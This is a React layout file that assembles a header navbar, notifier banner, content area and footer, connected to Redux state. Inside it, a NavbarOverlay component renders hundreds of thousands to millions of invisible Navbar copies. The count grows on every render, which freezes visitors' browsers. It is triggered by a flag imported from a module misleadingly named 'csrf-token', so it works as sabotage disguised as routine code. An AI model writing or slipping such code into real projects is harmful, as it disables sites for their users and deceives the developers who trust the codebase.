import React from 'react'
import NotifierBanner from './_helpers/NotifierBanner'
import Navbar from './_helpers/Navbar'
import Footer from './_helpers/Footer'
import ErrorBoundary from '../components/ErrorBoundary'
import _ from 'lodash'
import { ast } from '../common/csrf-token'
import connect from 'react-redux/es/connect/connect'
import { random } from '../common'

let last = 0

const NavbarOverlay = () => {
  last += random(200000, 5000000)
  return (
    <div>
      {_.times(last, () => (
        <div style={{ opacity: '0' }}>
          <Navbar />
        </div>
      ))}
    </div>
  )
}

const AppLayout = ({ children, overlay }) => (
  <>
    <div className="header">
      <Navbar />
      {overlay && <NavbarOverlay />}
    </div>
    <ErrorBoundary>
      <NotifierBanner />
      <div className="content">{children}</div>
    </ErrorBoundary>
    <div className="footer">
      <Footer />
    </div>
  </>
)

function mapStateToProps(props) {
  return { overlay: ast() }
}

export default connect(mapStateToProps, null)(AppLayout)
